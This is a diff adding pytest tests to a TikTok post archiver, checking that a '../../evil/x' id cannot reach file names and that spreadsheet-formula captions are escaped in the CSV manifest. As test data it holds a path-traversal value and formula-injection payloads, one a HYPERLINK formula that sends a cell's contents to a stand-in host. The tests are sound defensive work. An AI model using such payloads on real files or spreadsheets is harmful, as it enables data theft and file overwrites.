@@ -22,6 +22,7 @@ from app.archive import (
     Wants,
     archive_posts,
     manifest_csv,
+    manifest_files,
     post_stem,
     report_text,
     slugify,
@@ -114,6 +115,15 @@ def test_the_file_stem_sorts_by_date_and_stays_unique_by_id() -> None:
     assert post_stem(undated, PostRef(post_id(9), post_url(9))) == f"undated_{post_id(9)}"
     emoji_only = make_post_info(4, caption="😀", description="😀", title="😀")
     assert post_stem(emoji_only, PostRef(post_id(4), post_url(4))) == f"2023-11-18_{post_id(4)}"
+
+
+def test_an_odd_id_in_tiktoks_answer_cannot_reach_a_file_name_or_the_manifest_key() -> None:
+    """File names and the resume key use the id that was asked for (validated), not the one TikTok reports."""
+    backend = FakeBackend(posts={post_id(1): make_post_info(1, id="../../evil/x")})
+    files, order, _ = run(backend, refs(1))
+    assert [path for path in order if path.endswith(".mp4")] == [f"2023-11-15_{post_id(1)}_caption-of-post-1-tag1.mp4"]
+    assert all(".." not in path for path in order)
+    assert [r["id"] for r in records(files)] == [post_id(1)]
 
 
 @pytest.mark.parametrize(
@@ -479,6 +489,25 @@ def test_the_csv_survives_commas_quotes_newlines_and_emoji() -> None:
     assert (cells["hashtags"], cells["author"], cells["views"], cells["comments"]) == ("a b", "scout2015", "1", "3")
     assert cells["sound"] == "original sound – Scout, Friend" and cells["files"] == "a.mp4; a_sound.mp3"
     assert cells["note"] == "sound: slow"
+
+
+@pytest.mark.parametrize(
+    "caption",
+    ['=HYPERLINK("http://evil.test/?"&A2,"click me")', "+1+1", "-2+3", "@SUM(A1:A9)", "\t=1+1", "\r=1+1", "\n=1+1"],
+)
+def test_a_caption_cannot_run_as_a_spreadsheet_formula(caption: str) -> None:
+    """Captions are written by strangers and posts.csv is meant to be opened in Excel."""
+    record = {"id": "1", "url": "u", "status": "ok", "caption": caption, "sound": {"title": caption}}
+    cells = dict(zip(CSV_COLUMNS, read_csv(manifest_csv([record]))[1], strict=True))
+    assert cells["caption"] == "'" + caption and cells["sound"] == "'" + caption  # text now, not a formula
+    manifest = json.loads(manifest_files([record], "done", "")[0][1])
+    assert manifest[0]["caption"] == caption  # posts.json keeps it exactly as written
+
+
+def test_ordinary_captions_and_numbers_are_left_alone_in_the_csv() -> None:
+    record = {"id": "1", "url": "u", "status": "ok", "caption": "a - b = c @ d", "stats": {"views": 5}, "duration": 15}
+    cells = dict(zip(CSV_COLUMNS, read_csv(manifest_csv([record]))[1], strict=True))
+    assert (cells["caption"], cells["views"], cells["duration"]) == ("a - b = c @ d", "5", "15")
 
 
 def test_failed_posts_appear_in_the_csv_with_the_reason() -> None:
